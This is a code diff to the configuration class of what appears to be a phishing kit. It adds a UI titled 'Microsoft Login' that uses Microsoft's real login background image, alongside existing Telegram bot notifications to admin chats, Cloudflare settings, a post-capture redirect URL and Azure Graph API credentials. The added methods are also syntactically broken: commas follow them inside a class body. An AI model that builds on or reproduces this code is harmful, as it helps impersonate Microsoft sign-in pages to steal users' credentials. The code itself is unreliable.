@@ -6,7 +6,7 @@ class Config {
     constructor() {
         // Load environment variables from .env file if it exists
         this.loadEnvFile();
-        
+
         // Initialize all configuration
         this.server = this.initServerConfig();
         this.security = this.initSecurityConfig();
@@ -14,7 +14,18 @@ class Config {
         this.automation = this.initAutomationConfig();
         this.cloudflare = this.loadCloudflareConfig();
         this.redirect = this.loadRedirectConfig();
-        
+
+        // UI configuration
+        this.ui = {
+            title: process.env.UI_TITLE || 'Microsoft Login',
+            backgroundUrl: null, // Will be loaded from file
+        };
+
+        // Load configurations on startup
+        this.loadCloudflareConfig();
+        this.loadRedirectConfig();
+        this.loadBackgroundConfig();
+
         // Validate critical configurations
         this.validate();
     }
@@ -65,7 +76,7 @@ class Config {
         return {
             telegram: {
                 botToken: process.env.TELEGRAM_BOT_TOKEN,
-                adminChatIds: process.env.ADMIN_CHAT_IDS ? 
+                adminChatIds: process.env.ADMIN_CHAT_IDS ?
                     process.env.ADMIN_CHAT_IDS.split(',').map(id => id.trim()) : []
             },
             azure: {
@@ -96,7 +107,7 @@ class Config {
     // Generate encryption seed
     generateEncryptionSeed() {
         const seedFile = path.join(process.cwd(), '.encryption-seed');
-        
+
         if (fs.existsSync(seedFile)) {
             try {
                 const existingSeed = fs.readFileSync(seedFile, 'utf8').trim();
@@ -108,17 +119,17 @@ class Config {
                 console.warn('⚠️ Error reading existing seed file:', error.message);
             }
         }
-        
+
         // Generate new secure seed
         const newSeed = crypto.randomBytes(32).toString('hex');
-        
+
         try {
             fs.writeFileSync(seedFile, newSeed, 'utf8');
             console.log('🔑 Generated new encryption seed and saved to file');
         } catch (error) {
             console.warn('⚠️ Could not save seed to file:', error.message);
         }
-        
+
         return newSeed;
     }
 
@@ -136,14 +147,14 @@ class Config {
             try {
                 const savedConfig = JSON.parse(fs.readFileSync(configFile, 'utf8'));
                 const config = { ...defaultConfig, ...savedConfig };
-                
+
                 if (config.configured) {
                     console.log('🌤️ Cloudflare configuration loaded from file');
                     if (config.apiKey) {
                         console.log('✅ Global API Key authentication configured');
                     }
                 }
-                
+
                 return config;
             } catch (error) {
                 console.warn('⚠️ Error loading Cloudflare config:', error.message);
@@ -187,39 +198,69 @@ class Config {
         }
     }
 
-    // Save redirect configuration
+    // Save redirect configuration to file
     saveRedirectConfig(redirectUrl) {
-        const configFile = path.join(process.cwd(), 'redirect-config.json');
         try {
-            this.redirect = {
-                redirectUrl: redirectUrl,
-                lastUpdated: new Date().toISOString()
-            };
-            fs.writeFileSync(configFile, JSON.stringify(this.redirect, null, 2));
-            console.log('📝 Redirect configuration saved successfully');
-            return true;
+            const configPath = path.join(__dirname, '..', 'redirect-config.json');
+            const configData = { redirectUrl };
+            fs.writeFileSync(configPath, JSON.stringify(configData, null, 2));
+            this.redirect.redirectUrl = redirectUrl;
+            console.log('✅ Redirect configuration saved to file');
         } catch (error) {
-            console.error('❌ Error saving redirect config:', error.message);
-            return false;
+            console.error('❌ Failed to save redirect configuration:', error.message);
+            throw error;
         }
-    }
+    },
+
+    // Save background URL configuration to file
+    saveBackgroundUrl(backgroundUrl) {
+        try {
+            const configPath = path.join(__dirname, '..', 'background-config.json');
+            const configData = { backgroundUrl };
+            fs.writeFileSync(configPath, JSON.stringify(configData, null, 2));
+            this.ui.backgroundUrl = backgroundUrl;
+            console.log('✅ Background URL configuration saved to file');
+        } catch (error) {
+            console.error('❌ Failed to save background URL configuration:', error.message);
+            throw error;
+        }
+    },
+
+    // Load background URL configuration from file
+    loadBackgroundConfig() {
+        try {
+            const configPath = path.join(__dirname, '..', 'background-config.json');
+            if (fs.existsSync(configPath)) {
+                const configData = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+                this.ui.backgroundUrl = configData.backgroundUrl;
+                console.log('🎨 Background URL configuration loaded from file');
+            } else {
+                // Set default background URL
+                this.ui.backgroundUrl = 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg';
+            }
+        } catch (error) {
+            console.error('⚠️ Failed to load background URL configuration:', error.message);
+            // Set default background URL on error
+            this.ui.backgroundUrl = 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg';
+        }
+    },
 
     // Validate critical configuration
     validate() {
         const warnings = [];
-        
+
         if (!this.services.telegram.botToken) {
             warnings.push('TELEGRAM_BOT_TOKEN not configured - Telegram notifications disabled');
         }
-        
+
         if (!this.services.azure.clientId || !this.services.azure.clientSecret || !this.services.azure.tenantId) {
             warnings.push('Azure configuration incomplete - Graph API functionality may be limited');
         }
-        
+
         warnings.forEach(warning => {
             console.log(`⚠️ ${warning}`);
         });
-        
+
         console.log('✅ Configuration initialized successfully');
     }
 
@@ -236,7 +277,8 @@ class Config {
             services: this.services,
             automation: this.automation,
             cloudflare: this.cloudflare,
-            redirect: this.redirect
+            redirect: this.redirect,
+            ui: this.ui
         };
     }
 }
